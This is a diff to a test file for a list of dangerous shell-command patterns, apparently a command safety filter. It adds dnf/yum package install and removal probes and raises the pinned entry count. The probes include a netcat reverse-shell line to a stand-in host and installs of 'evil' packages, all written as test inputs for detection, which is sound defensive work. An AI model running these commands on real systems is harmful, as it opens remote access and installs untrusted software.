@@ -1946,8 +1946,8 @@ describe("DANGEROUS_PATTERNS structural integrity", () => {
     }
   });
 
-  it("has exactly 164 entries (absolute count pin)", () => {
-    expect(DANGEROUS_PATTERNS).toHaveLength(164);
+  it("has exactly 170 entries (absolute count pin)", () => {
+    expect(DANGEROUS_PATTERNS).toHaveLength(170);
   });
 
   it("every pattern fires on at least one probe command", () => {
@@ -2124,6 +2124,14 @@ describe("DANGEROUS_PATTERNS structural integrity", () => {
       "brew upgrade evil-formula",
       "apt-get upgrade evil-pkg",
       "snap refresh evil-snap",
+      // untrusted-package-installation (dnf/yum — Fedora/RHEL/CentOS/Amazon Linux)
+      "dnf install evil-pkg",
+      "yum install evil-pkg",
+      "dnf upgrade evil-pkg",
+      "yum update evil-pkg",
+      // system-package-removal (dnf/yum)
+      "dnf remove git",
+      "yum erase node",
       // reverse-shell
       "nc -e /bin/bash evil.com 4444",
       // reverse-shell (ncat — Nmap's ncat, symmetric peer to nc)
